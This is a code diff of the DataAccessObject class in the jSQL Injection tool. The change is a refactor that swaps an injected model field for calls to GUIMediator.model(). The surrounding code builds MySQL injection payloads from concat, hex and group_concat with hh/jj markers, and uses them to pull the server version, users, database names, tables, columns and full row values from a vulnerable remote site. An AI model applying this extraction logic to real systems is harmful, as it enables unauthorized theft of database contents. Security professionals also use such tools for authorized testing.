@@ -17,7 +17,6 @@ import java.util.regex.Pattern;
 
 import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
-import com.jsql.model.InjectionModel;
 import com.jsql.model.Interruptable;
 import com.jsql.model.bean.Column;
 import com.jsql.model.bean.Database;
@@ -25,24 +24,20 @@ import com.jsql.model.bean.ElementDatabase;
 import com.jsql.model.bean.Request;
 import com.jsql.model.bean.Table;
 import com.jsql.tool.StringTool;
+import com.jsql.view.GUIMediator;
 
 public class DataAccessObject {
-    private InjectionModel model;
-    
-    public DataAccessObject(InjectionModel model){
-        this.model = model;
-    }
     
     /**
      * Get the initial database informations
      * => version{%}database{%}user{%}CURRENT_USER
      */
     public void getDBInfos() throws PreparationException, StoppableException {
-    	model.sendMessage("Fetching informations...");
+    	GUIMediator.model().sendMessage("Fetching informations...");
         
         String[] sourcePage = {""};
 
-        String hexResult = model.new Stoppable_loopIntoResults(model).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults().action(
             "concat(" +
                 "hex(" +
 		            "concat_ws(" +
@@ -63,19 +58,19 @@ public class DataAccessObject {
         );
 
         if(hexResult.equals("")){
-            model.sendResponseFromSite( "Show db info failed", sourcePage[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Show db info failed", sourcePage[0].trim() );
             throw new PreparationException();
         }
 
-        model.versionDB = StringTool.hexstr(hexResult).split("\\{%\\}")[0];
-        model.currentDB = StringTool.hexstr(hexResult).split("\\{%\\}")[1];
-        model.currentUser = StringTool.hexstr(hexResult).split("\\{%\\}")[2];
-        model.authenticatedUser = StringTool.hexstr(hexResult).split("\\{%\\}")[3];
+        GUIMediator.model().versionDB = StringTool.hexstr(hexResult).split("\\{%\\}")[0];
+        GUIMediator.model().currentDB = StringTool.hexstr(hexResult).split("\\{%\\}")[1];
+        GUIMediator.model().currentUser = StringTool.hexstr(hexResult).split("\\{%\\}")[2];
+        GUIMediator.model().authenticatedUser = StringTool.hexstr(hexResult).split("\\{%\\}")[3];
 
         // Inform the view that info should be displayed
         Request request = new Request();
         request.setMessage("MessageInfo");
-        model.interact(request);
+        GUIMediator.model().interact(request);
     }
     
     /**
@@ -87,10 +82,10 @@ public class DataAccessObject {
      * The process can be stopped by the user
      */
     public void listDatabases() throws PreparationException, StoppableException {
-    	model.sendMessage("Fetching databases...");
+    	GUIMediator.model().sendMessage("Fetching databases...");
         
         String[] sourcePage = {""};
-        String hexResult = model.new Stoppable_loopIntoResults(model).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults().action(
             "select+" +
                 "concat(" +
 	                "group_concat(" +
@@ -122,7 +117,7 @@ public class DataAccessObject {
         Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 
         if(!regexSearch.find()){
-            model.sendResponseFromSite( "Fetching databases fails", sourcePage[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Fetching databases fails", sourcePage[0].trim() );
             throw new PreparationException();
         }
         regexSearch.reset();
@@ -141,7 +136,7 @@ public class DataAccessObject {
         Request request = new Request();
         request.setMessage("AddDatabases");
         request.setParameters(databases);
-        model.interact(request);
+        GUIMediator.model().interact(request);
     }
 
     /**
@@ -157,12 +152,12 @@ public class DataAccessObject {
         Request request = new Request();
         request.setMessage("StartProgress");
         request.setParameters(database);
-        model.interact(request);
+        GUIMediator.model().interact(request);
 
         String tableCount = Integer.toString(database.getCount());
 
         String[] pageSource = {""};
-        String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults(interruptable).action(
             "select+" +
                 "concat(" +
 	                "group_concat(" +
@@ -198,7 +193,7 @@ public class DataAccessObject {
                 Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 
         if(!regexSearch.find()){
-            model.sendResponseFromSite( "Fetching tables fails", pageSource[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Fetching tables fails", pageSource[0].trim() );
         }else{
             regexSearch.reset();
 
@@ -216,14 +211,14 @@ public class DataAccessObject {
             Request request2 = new Request();
             request2.setMessage("AddTables");
             request2.setParameters(tables);
-            model.interact(request2);
+            GUIMediator.model().interact(request2);
         }
 
         // Inform the view that database job is finished
         Request request3 = new Request();
         request3.setMessage("EndProgress");
         request3.setParameters(database);
-        model.interact(request3);
+        GUIMediator.model().interact(request3);
     }
 
     /**
@@ -239,10 +234,10 @@ public class DataAccessObject {
         Request request = new Request();
         request.setMessage("StartIndeterminateProgress");
         request.setParameters(table);
-        model.interact(request);
+        GUIMediator.model().interact(request);
 
         String[] pageSource = {""};
-        String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults(interruptable).action(
             "select+" +
                 "concat(" +
 	                "group_concat(" +
@@ -277,7 +272,7 @@ public class DataAccessObject {
         Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 
         if(!regexSearch.find()){
-            model.sendResponseFromSite( "Fetching columns fails", pageSource[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Fetching columns fails", pageSource[0].trim() );
         }else{
             regexSearch.reset();
 
@@ -294,14 +289,14 @@ public class DataAccessObject {
             Request request2 = new Request();
             request2.setMessage("AddColumns");
             request2.setParameters(columns);
-            model.interact(request2);
+            GUIMediator.model().interact(request2);
         }
 
         // Inform the view that table job is finished
         Request request3 = new Request();
         request3.setMessage("EndIndeterminateProgress");
         request3.setParameters(table);
-        model.interact(request3);
+        GUIMediator.model().interact(request3);
     }
 
     /**
@@ -321,7 +316,7 @@ public class DataAccessObject {
         Request request = new Request();
         request.setMessage("StartProgress");
         request.setParameters(table);
-        model.interact(request);
+        GUIMediator.model().interact(request);
 
         // Build an array of column names
         List<String> columnsName = new ArrayList<String>();
@@ -339,7 +334,7 @@ public class DataAccessObject {
         formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))" ;
 
         String[] pageSource = {""};
-        String hexResult = model.new Stoppable_loopIntoResults(model, interruptable).action(
+        String hexResult = GUIMediator.model().new Stoppable_loopIntoResults(interruptable).action(
             "select+concat(" +
                 "group_concat(" +
 	                "0x6868," +
@@ -365,7 +360,7 @@ public class DataAccessObject {
         Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 
         if(!regexSearch.find()){
-            model.sendResponseFromSite( "Fetching values fails (row count can be inaccurate)", pageSource[0].trim() );
+            GUIMediator.model().sendResponseFromSite( "Fetching values fails (row count can be inaccurate)", pageSource[0].trim() );
         }
         regexSearch.reset();
 
@@ -409,7 +404,7 @@ public class DataAccessObject {
                 }
             }
             if(isIncomplete){
-                model.sendErrorMessage("Max string length reached on the distant MySQL server, the row number "+(indexRow+1)+" is incomplete:\n" +
+                GUIMediator.model().sendErrorMessage("Max string length reached on the distant MySQL server, the row number "+(indexRow+1)+" is incomplete:\n" +
                         StringTool.join(listValues.get(indexRow).toArray(new String[listValues.get(indexRow).size()]), ", ") );
             }
         }
@@ -422,12 +417,12 @@ public class DataAccessObject {
         Request request2 = new Request();
         request2.setMessage("CreateValuesTab");
         request2.setParameters(objectData);
-        model.interact(request2);
+        GUIMediator.model().interact(request2);
 
         // Inform the view that table job is finished
         Request request3 = new Request();
         request3.setMessage("EndProgress");
         request3.setParameters(table);
-        model.interact(request3);
+        GUIMediator.model().interact(request3);
     }
 }
